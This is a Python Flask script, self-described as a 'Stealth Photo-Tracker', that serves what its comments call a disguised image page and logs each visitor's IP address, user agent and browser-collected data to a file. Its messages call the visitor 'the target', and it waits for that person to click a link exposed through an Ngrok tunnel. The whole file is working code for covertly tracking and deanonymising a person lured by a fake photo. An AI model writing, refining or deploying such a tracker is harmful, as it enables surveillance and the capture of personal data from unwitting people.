from flask import Flask, request, render_template
import datetime
import json
import os

app = Flask(__name__)

# Make sure we have a file to write to
LOG_FILE = 'target_logs.txt'

@app.route('/')
def index():
    # Serve the disguised image page
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log_data():
    # Grab the target's IP Address
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Grab the data sent from the browser's JavaScript
    data = request.json
    
    # Construct the log entry
    log_entry = {
        "timestamp": str(datetime.datetime.now()),
        "ip": ip_address,
        "user_agent": request.headers.get('User-Agent'),
        "browser_data": data
    }
    
    # Save the data to our text file
    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps(log_entry, indent=4) + "\n" + "-"*50 + "\n")
        
    print(f"\n[+] BOOM! NEW HIT! Data captured from IP: {ip_address}")
    print(f"[*] Check {LOG_FILE} for details.\n")
    return "OK", 200

if __name__ == '__main__':
    print("[*] Stealth Photo-Tracker is running!")
    print("[*] Waiting for the target to click the link...")
    # Listen on port 5000 to match the active Ngrok tunnel
    app.run(host='0.0.0.0', port=5000)
